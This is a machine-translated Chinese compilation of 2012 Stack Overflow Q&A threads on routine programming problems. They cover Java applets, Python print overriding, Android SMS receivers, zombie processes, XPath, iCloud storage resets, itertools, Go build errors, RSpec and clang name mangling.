我的问题是，当我尝试将存储在`resources`目录中的图像加载到我的小程序（编译时位于类目录中）时，JVM 会引发一个`AccessControlException`. 我在 stackoverflow 中阅读了很多关于此的帖子，现在我明白了为什么会这样（保护用户不访问他的文件）。我还读到您可以编写策略文件来修复它或签名的 jar。

这就是我加载图像的方式：

```
Image image = getImage(getCodeBase(),"path/to/the/image/image.png"); 
```

我注意到，`AccesControlException`当我要加载的图像位于`classes`子目录之一时，不会出现这种情况。所以我不能`..`用来访问 `classes`父目录，然后是`resources`目录。有什么方法可以加载我的图像而不必将它们放在`classes`子目录中并且不使用策略文件或签名的 jar？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T07:00:38.887

> “我不能`..`用来访问类父目录，然后是资源目录。

为什么不？一直为我工作。例如，参见[这个小程序](http://pscode.org/fmt/?url=http%3A%2F%2Fpscode.org%2Ftest%2Fmemapplet%2FMemoryTestApplet.java&col=2&fnt=2&tab=2&ln=0)。不幸的是，它是受信任的（允许它到达跨站点），但是如果您正在运行 Oracle JRE，您应该能够`Cancel`通过信任请求看到类似..

![从同一站点访问 URL](../Images/072044eca4f02f7c0678eff8fc2fba23.png)

在这个小程序中：

*   HTML 位于[http://pscode.org/fmt/](http://pscode.org/fmt/) (-> index.html)
*   代码和代码库位于[http://pscode.org/lib/](http://pscode.org/lib/)
*   来源（资源）在[http://pscode.org/test/memapplet/MemoryTestApplet.java](http://pscode.org/test/memapplet/MemoryTestApplet.java)

底线是，applet 应该能够从服务器将为其提供资源的主服务器上的*任何位置获取资源。*

# python - 如何“全局”“重载”python的打印功能？

> ID：13870928
> 
> 赞同：8
> 
> 时间：2012-12-14T00:29:23.480
> 
> 标签：python, namespaces, python-2.6

我正在使用 python 2.6.6，我需要重载默认的 python 打印功能。我需要这样做，因为此代码可能用于必须使用内置函数生成输出的系统上，否则不会显示输出。

因此，例如，如果您有这样的 python 脚本：

```
from __future__ import print_function

def NewPrint(Str):
    with open("somefile.txt","a") as AFile:
        AFile.write(Str)

def OverloadPrint():
    global print
    print = NewPrint

OverloadPrint()
print("ha") 
```

它工作正常。“重载”打印的输入位于 NewPrint 指定的文件中。

现在考虑到这一点，我希望能够运行上面的几行并让 print 完成 NewPrint 在整个脚本执行期间所做的事情。现在，如果我从另一个使用 print 的模块调用函数，它将使用内置的 print 而不是我刚刚覆盖的那个。我想这与命名空间和内置函数有关，但我的 python 还不够好。

**编辑：**

我试图保持简单，但看起来这引起了更多的混乱......

1.  **重载 print 的函数将打印到 GUI，因此如果**函数重载，则无需关心重定向。
2.  我知道我的示例没有执行 print 函数实际执行的操作。一个更好的例子来说明我是如何考虑编码的（我知道仍然不是很好）：

    ```
    def hli_print(*args, **kw):
        """
        print([object, ...], sep=' ', end='\n', file=sys.stdout)
        """
        sep = kw.get('sep', ' ')
        end = kw.get('end', '\n')
        File = kw.get('file', sys.stdout)
        args = [str(arg) for arg in args]
        string = sep.join(args) + end
        File.write(string)
        hli_Print(string) 
    ```

3.  从上面的 2 中，您可以看到我必须用来打印到 GUI“hli_Print”的函数，它是一个通过 swig 包装器公开的 C++ 函数。

4.  我们只使用标准库和我们自己的 swig 包装器，我们的开发人员也使用 print 作为函数（习惯于 3.X）。所以我并不太担心其他一些调用 print 的模块并有其他的东西。

从所有评论中，我猜只使用一些 print_() 函数而不是 print() （这是我们目前所做的）可能是最好的，但我真的很想知道在 python 中是否可以做我所做的事情描述。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-14T02:36:04.857

正如@abarnert 的回答和一些评论所指出的那样，替换`print`可能不是一个好主意。但只是为了完整起见，这就是为什么您的代码没有成功地为其他模块覆盖它的原因。

该`print`函数在模块中定义（在 Python 3[`__builtin__`](http://docs.python.org/2/library/__builtin__.html)中重命名为）。`builtins`Python 解释器使`__builtin__`模块命名空间中的所有内容都可用于它正在运行的所有其他代码，而无需将其导入模块自己的命名空间。太神奇了！

但是，当您创建自己的名为`print`（使用`print = NewPrint`）的函数时，它不会覆盖`__builtin__`. 您只是在模块的命名空间中创建一个新变量，该变量将旧变量从`__builtin__`. 该`global`语句没有帮助，因为它只允许您告诉 Python 您要写入模块的全局名称空间，而不是函数内部的某个内部名称空间。

要替换默认`print`函数，您需要在`__builtin__`模块中显式替换它。这是一些执行此操作的示例代码：

```
from __future__ import print_function
try:
    import __builtin__ as builtins # Python 2
except ImportError:
    import builtins # Python 3

_print = print # keep a local copy of the original print
builtins.print = lambda *args, **kwargs: _print("foo:", *args, **kwargs) 
```

再说一遍，这真的不是一个好主意。在确保我理解我在这个答案中所说的内容的同时，我设法通过替换`print`一个不接受`file`Python 用于打印到标准错误的参数的 lambda 函数来使我的一个 Python 会话崩溃。几行之后，异常处理程序在尝试打印另一个异常的回溯时遇到第二个异常时不高兴。

几乎可以肯定有更好的方法来获得您想要的结果。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-14T00:36:57.370

我认为你的问题没有任何意义。

首先，如果您正在运行 Python 2.6，那么您导入的所有内容等都将使用`print`语句，即使您自己的模块正在使用该`print`函数。所以，重载函数不会影响其他任何东西。

其次，您说“我需要这样做，因为此代码可能用于必须使用内置函数生成输出的系统上，否则不会显示输出。” 好吧， your`NewPrint`不是内置函数，所以无论如何这都无济于事。

还值得注意的是，您`NewPrint`没有实现该函数的大部分`print`功能，即使它*确实*实现了一点，它也做错了（`print(s)`将打印`s` *后跟换行符*）。因此，如果您*确实*用您的内置函数替换了内置`print`函数，那么您最终只会破坏您自己的大部分代码以及您所依赖的任何 stdlib/第三方代码。

您可能可以通过创建一个类似文件的对象来替换`sys.stdout`. 否则，我看不出有什么办法。例如：

```
class FakeStdOut(object):
    # … lots of other stuff to implement or inherit
    def write(s):
        with open("somefile.txt", "a") as f:
            f.write(s)

def OverloadPrint():
    sys.stdout = FakeStdOut() 
```

但即使这有效，它也可能不是你*真正*想要的。对于一个快速而肮脏的脚本，在一个有缺陷的 shell 的平台上，这有时是一个方便的想法。但否则，从长远来看，它可能会给您带来更多麻烦，而不是提出更好的解决方案。这只是一些可能出错的事情（仅作为示例，并非详尽的列表）

*   如果您想更改输出到的文件，则必须修改脚本。如果您改为`>>`在 shell 中使用，则可以以不同的方式调用脚本。
*   阅读或调试您的代码的人（例如，您，三个月后您忘记了它是如何工作的）会对正在发生的事情感到惊讶。
*   一些标准库/第三方/同事/等。`stdout`您调用的代码将在您进行更改之前检查这是一个 tty，并为交互式输出配置自身。
*   一些代码会在您有机会重定向之前打印出来，并且您将花费数小时试图弄清楚如何重新排序以解决问题。
*   你必须知道如何完全实现一个“类文件对象”——这个概念在 2.6 中没有完全定义——否则它会被一些代码破坏。
*   在某个地方，有一些您认为正在运行的代码`print`，但实际上是在运行`log`或写入`sys.stderr`或执行其他操作，因此您给自己一种错误的安全感，您现在正在登录所有内容`somefile.txt`，并且不会直到 6 个月后，当您迫切需要缺少的信息来调试客户站点的问题时，才能发现其他情况。

既然你已经编辑了这个问题，这里有一些进一步的回应：

> 从所有评论中，我猜只是使用一些 print_() 函数而不是 print()

是的，这是一个更合理的选择。但我可能不会这样称呼它`print_`。并且将“做或不做”逻辑放在函数中更简单，而不是在全局名称中进出交换实现（特别是因为如果您的代码不是全部，您将在某个时候搞砸一个大模块）。

我曾在一个具有类似用例的项目中工作：我们有想要进入系统日志的消息，如果它是打开的，还可以进入一个 GUI“日志窗口”。所以我们写了一个`glog`函数来包装它，没有人抱怨他们想改写`print`。（事实上​​，团队中至少有一个人非常高兴他可以`print`在调试时使用快速而肮脏的打印输出而不影响实际输出，尤其是当他必须调试 GUI 日志代码时。）

`logging`但这只是因为我们对新的（当时的）模块没有任何经验。现在，我想我会创建一个`logging` `Handler`写入 GUI 窗口的实现，然后添加该处理程序，并在`logging`任何地方使用标准方法。听起来这可能是您的最佳选择。

此外，最后一个可能无关紧要的问题：

> 我们只使用标准库和我们自己的 swig 包装器，我们的开发人员也使用 print 作为函数（习惯于 3.X）。

那么为什么不首先使用 3.x 呢？显然 3.x 具有实际的 3.x 标准库，而不是类似于 3.x 标准库的东西，如果您执行一些`__future__`语句，并且 SWIG 与 3.x 一起使用......</p>

# android - Android - SMS BroadcastReceiver 在模拟器上工作但不在电话上

> ID：13870929
> 
> 赞同：1
> 
> 时间：2012-12-14T00:29:24.527
> 
> 标签：android

我只是想知道为什么我的简单短信接收器可以在我的模拟器（2.3）上工作，但不能在我的手机（2.3）上工作。

每当我收到一条新短信时，我的简单程序都会显示祝酒词。它显示在模拟器上，而不是在手机上。

我尝试了两个模拟器，它可以工作。

这是代码。

```
public class SMSReceiver extends BroadcastReceiver {

 @Override
 public void onReceive(Context context, Intent intent) {
    // TODO Auto-generated method stub
    System.out.println("A new message just arrived.");
    Toast.makeText(context, "weee", Toast.LENGTH_LONG).show();
 }

} 
```

显现：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.smsreceiver"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="16" />

<uses-permission android:name="android.permission.RECEIVE_SMS" />

<application
    android:allowBackup="true"
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name="com.example.smsreceiver.MainActivity"
        android:label="@string/app_name" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

    <receiver android:name=".SMSReceiver" android:exported="true">
        <intent-filter>
         <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
        </intent-filter>
    </receiver>

</application>

</manifest> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-09T13:26:27.617

您的广播接收器已中止。添加优先级将解决问题。

```
<receiver>
<intent-filter android:priority="999">
<action: .... >
</receiver> 
```

在清单中设置优先级。这应该做。

# ios5 - 将文本字段分配给数组

> ID：13870937
> 
> 赞同：0
> 
> 时间：2012-12-14T00:30:20.823
> 
> 标签：ios5

我正在以编程方式在屏幕上绘制许多文本字段。如何将它们分配给数组并引用它们？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T05:17:31.183

在您创建它们的类中，您应该首先将数组创建为属性（在您的 .h 文件中：）

```
@property (nonatomic, strong) NSMutableArray *textFieldArray; 
```

然后，在您创建 textField 的位置：

```
self.textFieldArray = [NSMutableArray new];
[self.textFieldArray addObject:textField1];
[self.textFieldArray addObject:textField2];
[self.textFieldArray addObject:textField3]; 
```

然后，为了访问存储在数组中的文本字段，您将使用（根据需要更改索引号）：

```
UITextField *textField = [self.textFieldArray objectAtIndex:0]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:36:06.147

这真的取决于语言，但在 php 中你会用 [] 命名它们，所以

```
<input type="text" name="arr[]"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T11:13:26.203

您可以使用

实例方法 addObject：在数组末尾插入给定对象。

*   (void)addObject:(id)anObject

# c# - System.Lazy 和 System.Threading.LazyThreadSafetyMode 枚举

> ID：13870941
> 
> 赞同：5
> 
> 时间：2012-12-14T00:30:48.737
> 
> 标签：c#, .net-4.0, lazy-initialization

使用 C#/.NET 4.0，`Lazy<T>`可以如下声明对象。

```
using System;
using System.Threading;
...
var factory = () => { return new object(); };
var lazy = new Lazy<object>(factory, LazyThreadSafetyMode.ExecutionAndPublication); 
```

`LazyThreadSafetyMode`枚举中的其他选项是`PublicationOnly`和`None`。

为什么没有`ExecutionOnly`选项？

这种情况下的行为是工厂方法最多由单个线程调用一次，即使多个线程尝试获取`lazy.Value`. 一旦工厂方法完成并缓存了单个结果，许多线程将能够同时访问lazy.Value（即，在初始工厂方法之后没有线程安全）。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-14T00:39:42.540

你描述的行为是有效的`LazyThreadSafetyMode.ExecutionAndPublication`。这允许多个线程访问`Value`，但只有一个线程可以运行初始化方法。

此枚举仅用于确定创建方式 - 您始终可以`Value`从多个线程访问。

# php - jquery 可排序和可放置 - 不能附加放置项目？

> ID：13870942
> 
> 赞同：0
> 
> 时间：2012-12-14T00:30:51.407
> 
> 标签：php, jquery, jquery-ui, jquery-ui-sortable, jquery-ui-droppable

我想将已删除的项目附加到可排序列表中的目标可放置框中，但我无法将已删除的项目附加到特定元素中。

我的jQuery，

```
$(".sortable").sortable({
    update: function(){
    // php update.
    }
}).disableSelection();

$( ".droppable" ).droppable({
    activeClass: "ui-state-hover",
    hoverClass: "ui-state-active",
    drop: function( event, ui ) {

        var targetElem = $(this).attr("id");

        $( this )
            .addClass( "ui-state-highlight" )
            .find( "p" )
            .html( "Dropped! inside " + targetElem );

            alert(targetElem);

        var container = $( this ).find( "ul.dropped-items" ).css({border:"blue solid 1px"});

        container.append(ui.draggable.clone());

        ui.draggable.remove();

    }
}); 
```

丢弃的项目应附加到此元素中，

```
<ul class="dropped-items">
</ul> 
```

但它只是没有发生。我错过了什么，我怎样才能让它发挥作用？

[jsfiddle 测试页面](http://jsfiddle.net/sAEar/)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:49:59.930

您可以删除元素上的绝对位置样式：

**Javascript**

```
...
container.append(ui.draggable.clone().css({position: 'relative', left: 0, top: 0, width: 'auto', height: 'auto'}));
... 
```

**[演示](http://jsfiddle.net/sAEar/6/)**

或者，添加样式以执行相同操作：

**CSS**

```
.dropped-items li {
    position: relative !important;
    top: 0 !important;
    left: 0 !important;
    width: auto !important;
    height: auto !important;
} 
```

**[演示](http://jsfiddle.net/sAEar/8/)**

# c - 如果父进程退出，我如何防止子进程成为僵尸进程

> ID：13870945
> 
> 赞同：3
> 
> 时间：2012-12-14T00:30:59.020
> 
> 标签：c, linux

我的主进程产生一个子进程。如果主进程被杀死，子进程的 ppid 将被分配为 1。当子进程退出时，它将变成僵尸，因为 init 没有在这个子进程上调用 wait()。有没有办法避免这种情况？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-14T00:32:55.493

`init` *将*调用`wait()`它继承的进程。僵尸应该只存在于孩子已经退出但父母仍在附近但尚未获得退出代码的地方。从`init`手册页：

> `init`是系统上所有进程的父进程，由内核执行，负责启动所有其他进程；它是其亲生父母已经死亡的所有进程的父进程，并*负责在他们死后收获这些进程。*

你应该区分孤儿（他们还活着，他们的父母已经死了，因此他们被收养了`init`）和僵尸（他们已经死了，但他们的父母还活着，还没有收割他们）。

孤儿在他们离开后但在收割它们之前会在很短的时间内变成僵尸，`init`但这段时间应该足够小以至于没有人注意到。事实上，*所有*退出进程（可能除了`init`它自己）都会经历这个短暂的僵尸阶段，只有在父进程收割速度不够快的情况下才会引起你的注意。

* * *

`init`child death ( ) 处理程序中的实际代码是`SIGCHLD`这样的（我的评论）：

```
void chld_handler (int sig) {
    CHILD  *ch;
    int    pid, st;
    int    saved_errno = errno;

    while ((pid = waitpid(-1, &st, WNOHANG)) != 0) { // << WAIT done here
        if (errno == ECHILD) break;
        for (ch = family; ch; ch = ch->next) {
            if (ch->pid == pid && (ch->flags & RUNNING)) {
                INITDBG (L_VB, child_handler: marked %d as zombie", ch->pid);
                ADDSET (got_signals, SIGCHLD);
                ch->exstat = st;
                ch->flags |= ZOMBIE;                 // Set to zombie here.
                if (ch->new) {
                    ch->new->exstat = st;
                    ch->new->flags |= ZOMBIE;
                }
                break;
            }
        }
        if (ch == NULL) {
            INITDBG (L_VB, "chld_handler: unknown child %d exited.", pid);
        }
    }
    errno = saved_errno;
} 
```

然后，稍后在主循环（不是信号处理程序）中，进程表中标记为的所有进程都将`ZOMBIE`被清除：

```
if (ISMEMBER (got_signals, SIGCHLD)) {
    INITDBG(L_VB, "got SIGCHLD");
    /* First set flag to 0 */
    DELSET(got_signals, SIGCHLD);

    /* See which child this was */
    for (ch = family; ch; ch = ch->next) {
        if (ch->flags & ZOMBIE) {                    // ZOMBIE detected here
            INITDBG (L_VB, "Child died, PID= %d", ch->pid);
            ch->flags &= ~(RUNNING|ZOMBIE|WAITING);  // And cleared here.
            if (ch->process[0] != '+') {
                write_utmp_wtmp ("", ch->id, ch->pid, DEAD_PROCESS, NULL);
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-15T15:44:12.070

在程序的最后放置一个**wait(NULL)**语句，这样父子进程就会互相等待，直到他们都完成了它的执行，并且任何人都不会成为僵尸进程。

# php - XML 通过 xPath 获取节点名称

> ID：13870947
> 
> 赞同：1
> 
> 时间：2012-12-14T00:31:06.290
> 
> 标签：php, xml, xpath

我有这个 XML

```
<Parent>
 <Children>
  <child1>1</child1>
  <secondchild>2</secondchild>
  <child3>3</child3>
  <fourth>4</fourth>
 </Children>
</Parent> 
```

使用 xpath，我想让每个`Children`节点的**名称**以：

*   孩子1
*   次要
*   孩子3
*   第四

类似`Parent/Children/*[@name]` .. 不针对任何属性，只有主子节点名称

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:46:17.933

也许是这样：

```
<?php
$string = '<Parent>
 <Children>
  <child1>1</child1>
  <secondchild>2</secondchild>
  <child3>3</child3>
  <fourth>4</fourth>
 </Children>
</Parent>';

$xml = new SimpleXMLElement($string);

$children = $xml->xpath('/Parent/Children/*');

foreach ($children as $child){
    echo $child->getName() . "\n";
} 
```

或者

```
<?php
$string = '<Parent>
 <Children>
  <child1>1</child1>
  <secondchild>2</secondchild>
  <child3>3</child3>
  <fourth>4</fourth>
 </Children>
</Parent>';

$xml = new SimpleXMLElement($string);

$children = $xml->xpath('/Parent/Children/*');
$result = array();

foreach ($children as $child){
    $result[] = $child->getName();
}

print_r($result); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:49:51.623

试试这个 XPATH：

```
Parent/Children/*/name() 
```

这会在结果节点上调用 name() 函数。

# objective-c - 如何正确重置应用程序的 iCloud 存储

> ID：13870954
> 
> 赞同：2
> 
> 时间：2012-12-14T00:31:47.973
> 
> 标签：objective-c, ios, icloud

我现在正在将 iCloud 添加到我的应用程序中，并且为了能够测试升级方案，我需要不时地完全重置 iCloud 存储。

从设置中删除应用程序和应用程序数据是否足够？我以前这样做过，它导致了很多错误。

完全重置 iCloud 设置和存储以启动应用程序的正确方法是什么，就好像它是一个全新的应用程序安装一样？

干杯和感谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-14T00:37:07.270

删除应用程序是不够的——事实上，iCloud 的好处在于它在应用程序沙箱之外。该过程可能因您使用的 iCloud 解决方案类型而异。

如果您使用 CoreData，这将是一个以编程方式遍历您的模型堆栈并删除的问题（如果您有一个设计良好且具有正确删除规则的模型，希望您可以从最高级别的关系中删除并让删除流程下）。

如果您使用的是键值存储，则非常简单：

获取对您的 iCloud 通用商店的引用，如下所示（可能您已经在某个地方找到了）：

```
@property (strong, nonatomic) NSUbiquitousKeyValueStore *ubiquitousStore; 
```

要清除它，请枚举它包含的对象并删除它们：

```
- (void)cleariCloudUbiquitousStore
{
    // Clear everything regardless of actual key:
    for (NSString *key in self.ubiquitousStore.dictionaryRepresentation.allKeys)
    {
            [self.ubiquitousStore removeObjectForKey:key];
    }

    // Sync back to iCloud    
    [self.ubiquitousStore synchronize];

} 
```

# python - 如何在 Python selenium 中从网页的 HTML 表中获取数据

> ID：13870955
> 
> 赞同：0
> 
> 时间：2012-12-14T00:31:50.680
> 
> 标签：python, selenium, bioinformatics

这就是我要的 ，

链接“http://tinyurl.com/2bp99mm”

用于`"EWQLVLNVWGKVEADIPGHGQEVLIRLFKGHPETLEKFDKFKHLKSEDEMKASEDLKKHGATVLTALGGILKKKGHHEAEIKPLAQSHATKHKIPVKYLEFISECIIQVLQSKHPGDFGADAQGAMNKALELFRKDMASNYKELGFQG"`爆破蛋白质序列。

生成的网页在表格上有一个链接列表。在 Accesion 列中，有一些网络链接是我的兴趣点

我只想要第一个链接的文本，它以数字开头，第二个字符为字母。在当前场景中，您会发现“3RGK_A”这是我想要的文本。

我知道我可以使用`links.add(driver.FindElements(By.TagName("a")));` ，但是如何满足链接的标准，以数字开头，第二个字符为 Alphabet 。

我迷路了，对 selenium 和 python 不熟悉，但试图快速学习.. 任何帮助都会得到重视

```
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait 
import time
import numpy,random
import sys,re

driver = webdriver.Firefox()

driver.get("http://tinyurl.com/2bp99mm")
inputElement = driver.find_element_by_name( "QUERY" )
inputElement.send_keys("EWQLVLNVWGKVEADIPGHGQEVLIRLFKGHPETLEKFDKFKHLKSEDEMKASEDLKKHGATVLTALGGILKKKGHHEAEIKPLAQSHATKHKIPVKYLEFISECIIQVLQSKHPGDFGADAQGAMNKALELFRKDMASNYKELGFQG")##str(seq2))

inputElement.submit()
# the page is ajaxy so the title is originally this:
print driver.title

driver.implicitly_wait(30)

click_event = driver.find_element_by_link_text("3RGK_A")
click_event.click() 
```

我希望程序找到“3RGK_A”是第一个链接并将值存储在一个对象中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T03:27:34.253

```
begin
   $driver.find_element(:link, "3RGK_A")
   puts "I found the link"
rescue
   puts "I couldn't find the link"
end 
```

# python - Python：如何获取 itertools _grouper 的长度

> ID：13870962
> 
> 赞同：53
> 
> 时间：2012-12-14T00:32:08.453
> 
> 标签：python, group-by, itertools

我正在使用 Python itertools 并使用 groupby 按最后一个元素对一堆对进行排序。我已经对其进行了排序，并且可以很好地遍历组，但是我真的很希望能够获得每个组的长度，而不必遍历每个组，增加一个计数器。

该项目是对一些数据点进行聚类。我正在使用成对的 (numpy.array, int)，其中 numpy 数组是一个数据点，整数是一个簇标签

这是我的相关代码：

```
data = sorted(data, key=lambda (point, cluster):cluster)
for cluster,clusterList in itertools.groupby(data, key=lambda (point, cluster):cluster):
    if len(clusterList) < minLen: 
```

在最后一行：`if len(clusterList) < minLen:`，我得到一个错误

> 'itertools._grouper' 类型的对象没有 len()

我查找了可用于 的操作`_groupers`，但找不到任何似乎可以提供组长度的内容。

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-12-14T00:35:44.430

仅仅因为您调用它`clusterList`并不会使其成为列表！它基本上是一个惰性迭代器，根据需要返回每个项目。不过，您可以将其转换为这样的列表：

```
clusterList = list(clusterList) 
```

或者这样做并一步获得它的长度：

```
length = len(list(clusterList)) 
```

如果您不想占用使其成为列表的内存，则可以这样做：

```
length = sum(1 for x in clusterList) 
```

请注意，原始迭代器将通过将其转换为列表或使用`sum()`公式来完全消耗。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-14T00:36:36.583

`clusterList`是`iterable`但它不是一个`list`。有时这可能有点令人困惑。你可以做一个`for`循环，`clusterList`但你不能在它上面做其他列表的事情（slice、len 等）。

修复：将结果分配`list(clusterList)`给`clusterList`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-03-01T08:16:42.050

您可以为此使用[基数包](https://github.com/wbolster/cardinality/blob/master/cardinality.py#L48-L52)。方法`count()`计算产生的项目数`iterable`。

> 基数：确定并检查任何可迭代对象的大小

以下代码为您提供了`clusterList`

```
import cardinality
cardinality.count(clusterList) 
```

# go - 执行格式错误

> ID：13870963
> 
> 赞同：7
> 
> 时间：2012-12-14T00:32:19.583
> 
> 标签：go

我最近在我的电脑上安装了 lubuntu 11.04。按照[这个](http://golang.org/doc/install/source)从源代码安装 go 的指南，在我的电脑上安装 golang 很顺利。为了测试我的安装，我运行了 hello.go 并得到了这个错误：

```
fork/exec /tmp/go-build748212890/command-line-arguments/_obj/a.out: exec format error 
```

我在谷歌上查了一下，我发现的一个更相关的结果是删除包，然后重新安装。那没有帮助。

你能告诉我是什么导致了这个错误，我该如何解决这个问题？

感谢，并有一个愉快的一天！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2017-05-23T22:53:20.707

我遇到了这个问题 - 这很简单：我将 $GOOS 设置为我正在测试的操作系统以外的其他东西。你不能做跨平台测试。所以对于“go test”，不要设置 $GOOS。我很确定你得到的“执行格式错误”是 go test 试图在错误的架构/操作系统上执行某些东西的结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-05-13T15:23:52.107

从 Goland 在 Windows 上收到此错误。问题是测试用例是嵌套的并且名称很长，这意味着生成的二进制文件的文件路径具有超长的名称。Windows 的最大文件路径限制为 260 个字符，并且二进制文件路径的总长度超过了该限制，因此出现了错误。例如

```
t.Run("Authentication Tests", func(t *testing.T) {
    t.Run("Given my conditions, when the function xyz is called, we expect this super 
           important result", func(t *testing.T) {

         })
}) 
```

解决方案是在测试用例名称中使用更少的单词

# ruby-on-rails - 如何在 RSpec 中传入一个名为“控制器”的参数？

> ID：13870965
> 
> 赞同：0
> 
> 时间：2012-12-14T00:32:20.477
> 
> 标签：ruby-on-rails, rspec, actioncontroller

我有一个控制器，它需要一个名为的参数`controller`，而我编写的 RSpec 测试似乎不喜欢我将它作为参数传递给`get`.

## 规格

```
require 'spec_helper'

describe PageHelpsController do

  describe 'GET :search' do

    it "returns" do
      get :search, { :controller => 'employer', :action => 'edit', :edition => 'usa', :anchor => 'collaborator' }
      response.status.should be_success
      response.should render_template(:partial => 'shared/page_help')
    end
  end

end 
```

## 错误

```
vagrant@debian-squeeze64:/vagrant$ bundle exec rspec spec/controllers/page_helps_controller_spec.rb 
F

Failures:

  1) PageHelpsController GET :search returns
     Failure/Error: Unable to find /vagrant/spec/controllers/page_helps_controller_spec.rb to read failed line
     ActionController::RoutingError:
       No route matches {:controller=>"employer", :action=>"search", :relative_url_root=>nil, :edition=>"usa"}
     # ./spec/controllers/page_helps_controller_spec.rb:11 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T08:06:14.457

假设您创建了一个名为`controller`.

问题是您通过创建一个名为`controller`. 假设有一个名为的控制器`Employer`当然不存在。这就是您收到路线错误的原因。要解决此问题，您必须将名为的参数更改为`controller`其他名称。

# linker - 建库时clang和clang++有什么区别？

> ID：13870967
> 
> 赞同：5
> 
> 时间：2012-12-14T00:32:29.997
> 
> 标签：linker, clang, clang++

我正在用 clang 编译 ac 库（供 c++ 项目使用）。尝试链接此库时出现链接器错误（特别是关于 hqxInit 函数的未定义符号）。当我切换到 clang++ 时，它可以工作。用 nm 检查，clang++ 进一步修改了名称。发生了什么——有没有更好的方法告诉链接器库是 munged-for-c 还是 munged-for-c++？必须用 c++ 构建 ac 库似乎很愚蠢....

// 用 clang 构建

```
$ nm libhqx.a

libhqx.bak(init.c.o)
04000000 C _RGBtoYUV
00000004 C _YUV1
00000004 C _YUV2
00000000 T _hqxInit 
```

// 用 clang++ 构建

```
$ nm libhqx.a 

libhqx.a(init.o):
00000100 S _RGBtoYUV
04000100 S _YUV1
04000104 S _YUV2
00000000 T __Z7hqxInitv 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-14T18:44:47.307

`clang`并且`clang++`在大多数系统上都是相同的可执行文件。一个只是到另一个的符号链接。

该程序检查以查看调用它的名称，并且：

*   for `clang`, 将代码编译为 C
*   for `clang++`, 将代码编译为 C++

在 C++ 中，编译器为函数生成的名称与 C 不同——这是因为您可以拥有多个具有相同名称（但不同）参数的函数。这称为“名称修改” - 这就是您所看到的。

您可以使用一个名为`c++filt`“拆解”名称的工具。

例子：

```
$ c++filt __Z7hqxInitv
hqxInit() 
```

更多信息在这里：[为什么 clang++ 的行为与 clang 不同，因为前者是后者的符号链接？](https://stackoverflow.com/questions/10359624/why-clang-behaves-differently-from-clang-since-the-former-is-a-symbol-link-of?rq=1)

# android - 将工作 Eclipse 项目导入新版本

> ID：13870970
> 
> 赞同：0
> 
> 时间：2012-12-14T00:32:55.850
> 
> 标签：android, eclipse, import

我安装了 eclipse Helios，但是，由于违反许可证，我无法安装插件。我卸载了Java SDK 1.7，删除了Eclipse文件夹，下载了eclipse JUNO（应该是最新版本）。我已经在 Windows 上安装了 Android sdk，但是，它看起来像 Eclipse 在导入它后第二次在不同的目录中安装了它。

我的问题是，我正在导入一个现有项目，（新的其他......从源代码构建 Android 项目）并且没有编译错误。一旦我运行程序，我就会得到这个错误日志：

```
12-14 00:06:39.906: E/AndroidRuntime(668): FATAL EXCEPTION: main

12-14 00:06:39.906: E/AndroidRuntime(668): java.lang.RuntimeException: Unable to start activity ComponentInfo{xxxxname.xnamepre.xnamepre2012/xxxxname.xnamepre.xnamepre2012.SplashScreen}: android.view.InflateException: Binary XML file line #8: Error inflating class android.support.v7.widget.Space

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread.access$600(ActivityThread.java:123)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.os.Handler.dispatchMessage(Handler.java:99)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.os.Looper.loop(Looper.java:137)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread.main(ActivityThread.java:4424)

12-14 00:06:39.906: E/AndroidRuntime(668):  at java.lang.reflect.Method.invokeNative(Native Method)

12-14 00:06:39.906: E/AndroidRuntime(668):  at java.lang.reflect.Method.invoke(Method.java:511)

12-14 00:06:39.906: E/AndroidRuntime(668):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)

12-14 00:06:39.906: E/AndroidRuntime(668):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)

